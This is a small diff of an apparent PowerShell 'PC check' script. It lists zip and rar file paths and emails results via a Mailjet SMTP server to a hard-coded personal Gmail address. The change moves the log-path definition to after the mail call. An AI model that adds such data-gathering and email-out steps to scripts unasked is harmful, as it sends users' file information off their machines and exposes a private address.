@@ -272,8 +272,6 @@ function Main {
         $zipRarFiles | ForEach-Object { Add-Content -Path $outputFile -Value $_.FullName }
     }
 
-    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
-    $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
     $sendMailMessageSplat = @{
     From = 'Sherm <andrew.p.sherman21@gmail.com>'
     To = 'Sherm <andrew.p.sherman21@gmail.com>'
@@ -285,7 +283,9 @@ function Main {
     SmtpServer = 'in-v3.mailjet.com'
 }
 Send-MailMessage @sendMailMessageSplat
-
+    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
+    $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
+    
     if (Test-Path $logFilePath) {
         Set-Clipboard -Path $logFilePath
         Write-Host "Log file copied to clipboard." -ForegroundColor Green
